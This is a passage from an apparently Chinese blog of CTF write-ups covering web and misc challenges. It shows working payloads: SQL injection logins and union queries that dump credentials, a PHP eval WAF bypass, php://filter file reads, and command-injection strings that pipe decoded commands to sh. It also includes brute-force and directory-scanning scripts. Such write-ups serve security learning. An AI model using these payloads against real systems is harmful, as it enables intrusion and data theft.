src="https://img-blog.csdnimg.cn/20200525223854595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>找了好久发现这里是输入的用户名和密码。它是进行了base64加密了。所以就需要将字典文件也进行加密。使用大佬写的python脚本。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token comment"># 字典文件路径</span>dic_file_path <span class="token operator">=</span> <span class="token string">'./10_million_password_list_top_100.txt'</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>dic_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    password_dic <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>username <span class="token operator">=</span> <span class="token string">'admin:'</span> <span class="token comment"># 用户名</span><span class="token keyword">for</span> password <span class="token keyword">in</span> password_dic<span class="token punctuation">:</span>    str1<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>username <span class="token operator">+</span> password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    encodestr <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    encodestr<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>encodestr<span class="token punctuation">)</span>    encodestr<span class="token operator">=</span>encodestr<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'b\''</span><span class="token punctuation">)</span>    encodestr<span class="token operator">=</span>encodestr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"\="</span><span class="token punctuation">)</span>   <span class="token comment">#避免“=”被转译</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>encodestr<span class="token punctuation">)</span></code></pre><p>然后复制一下运行出来的密码<br><img src="https://img-blog.csdnimg.cn/20200525224225717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>重新写一个txt字典文件。进行爆破。<br><img src="https://img-blog.csdnimg.cn/20200525224311965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>然后查看response<br><img src="https://img-blog.csdnimg.cn/20200525224356867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="技能树目录遍历"><a href="#技能树目录遍历" class="headerlink" title="技能树目录遍历"></a>技能树目录遍历</h2><p>第一个办法：傻瓜式操作，一个个找。（位置好像是随机的，可以自己找找）<br><img src="https://img-blog.csdnimg.cn/20200607101605251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>第二种方法：脚本查询<br>使用request库进行查询</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge-4d716e1afe267765.sandbox.ctfhub.com:10080/flag_in_here/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url_test <span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_test<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>        get_file<span class="token operator">=</span>r<span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"flag.txt"</span> <span class="token keyword">in</span> get_file<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url_test<span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200607102052940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后直接访问URL得到flag</p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p><img src="https://img-blog.csdnimg.cn/20200607103940919.png" alt="m0re" loading="lazy"><br>这个用dirsearch扫描，<br><img src="https://img-blog.csdnimg.cn/20200607104050139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>等它跑一会儿，等到index.php的时候ctrl+C就可以停下来了，不然太多。<br><img src="https://img-blog.csdnimg.cn/2020060710421253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后访问就可以下载了，打开文件<br><img src="https://img-blog.csdnimg.cn/20200607104241921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>界面挺帅的，黑色系列。判断一下闭合符号，发现是单引号闭合的字符型注入。<br><img src="https://img-blog.csdnimg.cn/20200708152717416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这样的登录框，首先应该想到的是万能密码，先看看能不能登录，如果能登陆再看看有没有有效信息，如果没有信息再进行寻常的注入。<br>这个是个简单的注入，所以万能密码就可以直接得到flag了</p><pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200708153134136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><pre class="language-html" data-language="html"><code class="language-html">flag&#123;a3fe1ac7-493c-4546-9aeb-5a244f6f254c&#125;</code></pre><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源码，这个好像没什么难度吧。<br><img src="https://img-blog.csdnimg.cn/2020070815360551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>直接出来了。<br><img src="https://img-blog.csdnimg.cn/20200708153800436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/20200708154438266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看源码注释说有waf，然后访问源码中提示的calc.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\t'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\r'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'"'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\['</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\]'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\$'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\\'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token single-quoted-string string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这个就是waf的规则了。需要绕过num，</p><blockquote><p>php的解析规则：当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析</p></blockquote><p>所以进行绕过只需要在num前面加上空格就OK了，<code>num</code>进行过滤，但是<code> num</code>前面加上空格就没有问题了，waf就不会管num之外的东西。<br>查看目录，使用ascii码绕过</p><pre class="language-html" data-language="html"><code class="language-html">? num=1;var_dump(scandir(chr(47)))</code></pre><p><img src="https://img-blog.csdnimg.cn/20200708160152253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到一个flagg的</p><pre class="language-html" data-language="html"><code class="language-html">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><p>查看到flag是<br><img src="https://img-blog.csdnimg.cn/20200708160337258.png" alt="m0re" loading="lazy"><br>方法二：http请求走私<br>这个看学长总结了，看着有点头大，还是以后基础扎实点了再学这个吧。</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>第一步：f12<br><img src="https://img-blog.csdnimg.cn/20200708231847568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>第二步：点击跳转到另一个页面<br><img src="https://img-blog.csdnimg.cn/20200708232034208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>中间跳转了，所以需要抓包分析<br><img src="https://img-blog.csdnimg.cn/20200708232208984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>找到了，然后访问<br><img src="https://img-blog.csdnimg.cn/20200708232328394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，flag.php可=可能有东西，先访问一下(虽然知道肯定没有结果)<br><img src="https://img-blog.csdnimg.cn/20200708232442327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>现在再来看上面的那个代码，是PHP伪协议的源代码，这里可以使用PHP伪协议，但是看到有过滤，过滤了带有<code>tp</code>的，还有<code>input、data</code>找一个没有过滤的伪协议进行解题。选择filter<br>payload</p><pre class="language-html" data-language="html"><code class="language-html">?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p><img src="https://img-blog.csdnimg.cn/20200708233000521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>base64解码，<br><img src="https://img-blog.csdnimg.cn/20200708233046833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>ha,这个结果出乎意料，试了几次发现解码问题<br><img src="https://img-blog.csdnimg.cn/20200708233147849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>post类型表单注入，先尝试万能密码</p><pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200709105728363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出是字符型注入，单引号闭合，接下来可以查询列数</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">#</span></code></pre><p>到四报错，判断有三列。<br><img src="https://img-blog.csdnimg.cn/20200709110232464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>爆数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200709110724621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库名为<code>geek</code></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin<span class="token string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>geek'<span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200709111033910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>题目是loveSQL，所以猜测flag可能在<code>l0ve1ysq1</code>中。<br>然后就是爆字段</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1'<span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200709111335356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个跟sqli-labs第一关几乎一样的。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200709111710317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就能找到flag</p><pre class="language-sql" data-language="sql"><code class="language-sql">flag&#123;d96f20f0<span class="token operator">-</span><span class="token number">79</span>fe<span class="token operator">-</span><span class="token number">4</span>a7a<span class="token operator">-</span><span class="token number">998</span>b<span class="token operator">-</span><span class="token number">4</span>cb9ebf4902b&#125;</code></pre><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这个题也是很有意思，可能有点linux基础的做起来更容易理解一点。<br>开启环境，是让/?ip，这样可以看出来是让在后面加上IP地址，然后考点应该是命令执行漏洞，先尝试127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20200709112820824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>ping成功了，然后就可以构造我们的命令执行漏洞的payload了</p><pre class="language-bash" data-language="bash"><code class="language-bash">?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">ls</span></code></pre><p>查看当前目录下的文件<br><img src="https://img-blog.csdnimg.cn/20200709113007716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就是cat一下看看内容。<br>但是发现好像有过滤<br><img src="https://img-blog.csdnimg.cn/20200709113127899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>空格被过滤了。关于命令执行漏洞的各种绕过，我刚学习总结一篇新的博客🥠——<a href="https://blog.csdn.net/qq_45836474/article/details/107248010">命令执行漏洞的各种绕过方式</a><br>我选择<code>$IFS</code>绕过</p><pre class="language-html" data-language="html"><code class="language-html">?ip=127.0.0.1|cat$IFSflag.php</code></pre><p><img src="https://img-blog.csdnimg.cn/20200709122219386.png" alt="m0re" loading="lazy"><br>flag也被过滤了，先查看一下index.php里面的内容。使用<code>$IFS</code>过滤好像没有什么内容返回，尝试一下使用<code>$IFS$1</code><br><img src="https://img-blog.csdnimg.cn/20200709122933625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token double-quoted-string string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -c 4 "</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></code></pre><p>可以看出，这个是过滤了许多标点，空格，bash,包括flag的贪婪匹配<br>绕过方法可以使用变量拼接</p><pre class="language-bash" data-language="bash"><code class="language-bash">?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token assign-left variable">a</span><span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span>.php</code></pre><p><img src="https://img-blog.csdnimg.cn/20200709234903375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>当然还有其他的方式，就不一一演示了。</p><pre class="language-bash" data-language="bash"><code class="language-bash">/?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token builtin class-name">echo</span><span class="token environment constant">$IFS</span><span class="token variable">$1Y2F0IGZsYWcucGhw</span><span class="token operator">|</span>base64<span class="token environment constant">$IFS</span><span class="token variable">$1</span>-d<span class="token operator">|</span><span class="token function">sh</span>绕过bash，使用sh同样可行/?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span><span class="token comment">#内联执行的做法：</span></code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h2><p>信息就是：两张图片，还有题目描述，不过我没发现这个有什么作用。<br>文件中隐藏了压缩包，foremost分离得到压缩包，尝试进行爆破<br><img src="https://img-blog.csdnimg.cn/20200706164411565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到文件中是一串base64编码，而且文件名也说明了就是beisi</p><pre class="language-html" data-language="html"><code class="language-html">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09YTJsc2JHVnljWFZsWlc0PQ==a2lsbGVycXVlZW4=killerqueen</code></pre><p>一直解下去就得到了最终结果。<br>然后提交了发现不对。😅<br><img src="https://img-blog.csdnimg.cn/20200706173012625.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后看了眼wp，好像是outguess<br><img src="https://img-blog.csdnimg.cn/20200706180403747.png" alt="m0re" loading="lazy"><br>桌面生成的hidden.txt打开就是flag了<br>以后要多长个心眼了。</p><h2 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single 